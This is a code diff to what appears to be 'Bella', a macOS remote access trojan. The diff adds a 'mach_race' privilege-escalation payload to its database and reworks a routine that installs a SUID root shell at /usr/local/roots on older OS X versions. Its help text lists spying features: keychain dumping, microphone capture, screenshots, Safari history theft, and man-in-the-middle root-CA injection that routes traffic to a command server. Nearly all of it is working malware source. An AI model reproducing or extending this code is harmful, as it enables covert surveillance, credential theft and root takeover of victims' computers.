@@ -149,13 +149,13 @@ def inject_payloads(payload_encoded):
 	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 	c = conn.cursor()
 	try:
-		(vncFile, kcFile, mcFile, rsFile, insomniaFile, lockFile, chainbreakerFile) = payload_encoded.splitlines()
-		c.execute("INSERT INTO payloads (id, vnc, keychaindump, microphone, root_shell, insomnia, lock_icon, chainbreaker) VALUES (1, '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (vncFile.encode('base64'), kcFile.encode('base64'), mcFile.encode('base64'), rsFile.encode('base64'), insomniaFile.encode('base64'), lockFile.encode('base64'), chainbreakerFile.encode('base64')))
+		(vncFile, kcFile, mcFile, rsFile, insomniaFile, lockFile, chainbreakerFile, machRace) = payload_encoded.splitlines()
+		c.execute("INSERT INTO payloads (id, vnc, keychaindump, microphone, root_shell, insomnia, lock_icon, chainbreaker, mach_race) VALUES (1, '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (vncFile.encode('base64'), kcFile.encode('base64'), mcFile.encode('base64'), rsFile.encode('base64'), insomniaFile.encode('base64'), lockFile.encode('base64'), chainbreakerFile.encode('base64'), machRace.encode('base64')))
 		conn.commit()
 		conn.close()
 		return True
 	except Exception as e:
-		print e
+		print repr(e)
 		conn.close()
 		return False
 
@@ -164,7 +164,7 @@ def createDB():
 		conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 		c = conn.cursor()
 		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, text)")
-		c.execute("CREATE TABLE payloads(id int, vnc text, keychaindump text, microphone text, root_shell text, insomnia text, lock_icon text, chainbreaker text)")
+		c.execute("CREATE TABLE payloads(id int, vnc text, keychaindump text, microphone text, root_shell text, insomnia text, lock_icon text, chainbreaker text, mach_race text)")
 		conn.commit()
 		conn.close()
 		print "Created Bella DB"
@@ -976,6 +976,7 @@ def manual():
 	value += "\n%sMITM Start%s\nInjects a Root CA into the System Roots Keychain and redirects all traffic to the CC.\nUsage: %smitm_start%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sMITM Kill%s\nEnds a MITM session started by MITM start.\nUsage: %smitm_kill%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sReboot Server%s\nRestarts a Bella instance.\nUsage: %sreboot_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sRemove Server%s\nCompletely removes a Bella server remotely.\nUsage: %sremoveserver_yes%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSafari History%s\nDownloads user's Safari history in a nice format.\nUsage: %ssafari_history%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sScreenshot%s\nTake a screen shot of the current active desktop.\nUsage: %sscreen_shot%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
@@ -1324,11 +1325,13 @@ def make_SUID_root_binary(password, LPEpath):
 	else:
 		#LPEpath should be a path to an interactive root shell (thinking mach race)
 		#### IF THIS LINE IS STILL HERE, THEN THIS MACH RACE / LPE DOES NOT WORK. Code needs to be added to actually install the shell ####
-		try:
-			subprocess.check_output("%s <<< 'chown 0:0 /usr/local/roots; chmod 4777 /usr/local/roots'" % LPEpath, shell=True) #perform setUID on shell
+		fugazy = subprocess.Popen("%s <<< 'chown 0:0 /usr/local/roots; chmod 4777 /usr/local/roots'" % LPEpath, shell=True, stdout=PIPE, stderr=PIPE)
+		error = fugazy.stderr.read()
+		if not 'traceroute6: invalid wait time' in error: #perform setUID on shell
 			return (True, "%sUser is susceptible to LPE!\n%sSUID root file written to /usr/local/roots!\n" % (blue_star, greenPlus))
-		except Exception as e:
-			return (False, "%sUser is susceptible to LPE!\n%sThere was an error setting the SUID bit.\n[%s]\n" % (greenPlus, red_minus, e))
+		else:
+			remove_SUID_shell()
+			return (False, "%sUser is susceptible to LPE!\n%sThere was an error setting the SUID bit and escalating.\n[%s]\n" % (greenPlus, red_minus, error.replace('\n', '')))
 
 def migrateToRoot(rootsPath):
 	#precondition to this function call is that a root shell exists at /usr/local/roots and that os.getuid != 0
@@ -1441,12 +1444,17 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 		send_msg("%sNo local user password found. This will give us system and can be phished.\n" % red_minus, False)
 
 	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
-		binarymake = make_SUID_root_binary(None, '%sexecuter/root_shell.sh' % get_bella_path())
+		root_escalate = payload_generator(readDB('mach_race', True))
+		binarymake = make_SUID_root_binary(None, root_escalate)
 		if binarymake[0]:
 			#updateDB('local privilege escalation', 'rootedMethod')
 			send_msg(binarymake[1], False)
 			migrateToRoot('/usr/local/roots')
 			send_msg('', True)
+			return
+		else:
+			send_msg(binarymake[1], True)
+			remove_SUID_shell()
 			return
 	send_msg("%sLocal privilege escalation not implemented for OSX %s\n" % (red_minus, sys_vers), True)
 	return
